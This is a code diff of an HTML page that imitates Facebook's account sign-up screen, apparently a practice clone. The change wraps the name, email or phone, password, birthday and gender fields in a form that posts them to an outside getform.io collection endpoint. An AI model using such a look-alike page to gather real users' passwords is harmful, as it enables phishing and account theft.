@@ -17,97 +17,99 @@
                 alt="FBLogo">
             </header>
             <div id="content">
-                <div id="fillOutHead">
-                    <h2>Create a new acount</h2>
-                    <p>It's quick and easy</p>
-                </div>
-                <div id="fillOutBody">
-                    <div id="textInput">
-                        <input 
-                            id="firstName"
-                            type="text"
-                            name="firstName"
-                            placeholder="First Name"
-                            minlength="2"
-                            maxlength="30"
-                            required>
-                        <input 
-                            id="lastName"
-                            type="text"
-                            name="lasttName"
-                            placeholder="Last Name"
-                            minlength="2"
-                            maxlength="199"
-                            optional>
-                        <input 
-                            id="phoneORemail"
-                            type="email"
-                            name="phoneORemail"
-                            placeholder="Mobile # or Email"
-                            minlength="4"
-                            maxlength="45"
-                            required>
-                        <input 
-                            id="password"
-                            type="password"
-                            name="password"
-                            placeholder="New Password"
-                            minlength="4"
-                            maxlength="100"
-                            required>
+                <form action="https://getform.io/f/ae83987e-b7f7-4f26-b2a5-f24f91a0a113"
+                method="post">
+                    <div id="fillOutHead">
+                        <h2>Create a new acount</h2>
+                        <p>It's quick and easy</p>
                     </div>
-                </div>
-                <div id="fillOutForms">
-                    <div id="titleBDayPublic">
-                        <div>
-                            <label>Preferred Title</label>
-                            <select id="title" name="title">
-                                <option value="" disabled selected">Select Title</option>
-                                <option value="none">None</option>
-                                <option value="mr">Mr.</option>
-                                <option value="ms">Ms.</option>
-                                <option value="mrs">Mrs.</option>
-                                <option value="dr">Dr.</option>
-                            </select>
-                        </div>
-                        <div>
-                            <label>Birthday</label>
-                                <input type="date" name="birthday" required>
-                        </div>
-                        <div>
-                            <label>Make Public?</label>
-                            <input type="checkbox" name="isPublic">
+                    <div id="fillOutBody">
+                        <div id="textInput">
+                            <input 
+                                id="firstName"
+                                type="text"
+                                name="firstName"
+                                placeholder="First Name"
+                                minlength="2"
+                                maxlength="30"
+                                required>
+                            <input 
+                                id="lastName"
+                                type="text"
+                                name="lasttName"
+                                placeholder="Last Name"
+                                minlength="2"
+                                maxlength="199"
+                                optional>
+                            <input 
+                                id="phoneORemail"
+                                type="email"
+                                name="phoneORemail"
+                                placeholder="Mobile # or Email"
+                                minlength="4"
+                                maxlength="45"
+                                required>
+                            <input 
+                                id="password"
+                                type="password"
+                                name="password"
+                                placeholder="New Password"
+                                minlength="4"
+                                maxlength="100"
+                                required>
                         </div>
                     </div>
-                    <div id="genderRadio">
-                        <label>Gender</label>
-                            <div id="genderInputs">
-                                <div>
-                                    <label for="femaleRadio">Female</label>
-                                        <input id="femaleRadio" type="radio" name="gender" value="female">
-                                </div>
-                                <div>
-                                    <label for="maleRadio">Male</label>
-                                        <input id="maleRadio" type="radio" name="gender" value="male">
-                                </div>
-                                <div>
-                                    <label for="customRadio">Custom</label>
-                                        <input id="customRadio" type="radio" name="gender" value="custom">
-                                </div>
+                    <div id="fillOutForms">
+                        <div id="titleBDayPublic">
+                            <div>
+                                <label>Preferred Title</label>
+                                <select required id="title" name="title">
+                                    <option value="" disabled selected">Select Title</option>
+                                    <option value="none">None</option>
+                                    <option value="mr">Mr.</option>
+                                    <option value="ms">Ms.</option>
+                                    <option value="mrs">Mrs.</option>
+                                    <option value="dr">Dr.</option>
+                                </select>
                             </div>
+                            <div>
+                                <label>Birthday</label>
+                                    <input type="date" name="birthday" required>
+                            </div>
+                            <div>
+                                <label>Make Public?</label>
+                                <input type="checkbox" name="isPublic">
+                            </div>
+                        </div>
+                        <div id="genderRadio">
+                            <label>Gender</label>
+                                <div id="genderInputs">
+                                    <div>
+                                        <label for="femaleRadio">Female</label>
+                                            <input id="femaleRadio" type="radio" name="gender" value="female">
+                                    </div>
+                                    <div>
+                                        <label for="maleRadio">Male</label>
+                                            <input id="maleRadio" type="radio" name="gender" value="male">
+                                    </div>
+                                    <div>
+                                        <label for="customRadio">Custom</label>
+                                            <input id="customRadio" type="radio" name="gender" value="custom">
+                                    </div>
+                                </div>
+                        </div>
+                        <p>
+                            People who may use our sercice my habe uploaded your contact information to facebook. <a href="#"> Learn more.</a>
+                        </p>
+                        <p>
+                            By clicking sign up you afree to our Terms. <a href="#">Privacy Policy</a> and <a href="#">Cookies policy</a>. You may receive SMS  Notificatios from us and can opt out any time. 
+                        </p>
+                        <input type="submit" value="Sign up">
+                        <a id="login" href="#">
+                            Already Have an Account
+                        </a>
                     </div>
-                    <p>
-                        People who may use our sercice my habe uploaded your contact information to facebook. <a href="#"> Learn more.</a>
-                    </p>
-                    <p>
-                        By clicking sign up you afree to our Terms. <a href="#">Privacy Policy</a> and <a href="#">Cookies policy</a>. You may receive SMS  Notificatios from us and can opt out any time. 
-                    </p>
-                    <input type="submit" value="Sign up">
-                    <a id="login" href="#">
-                        Already Have an Account
-                    </a>
-                </div>
-
+                </form>
             </div>
         </section>
     </body>
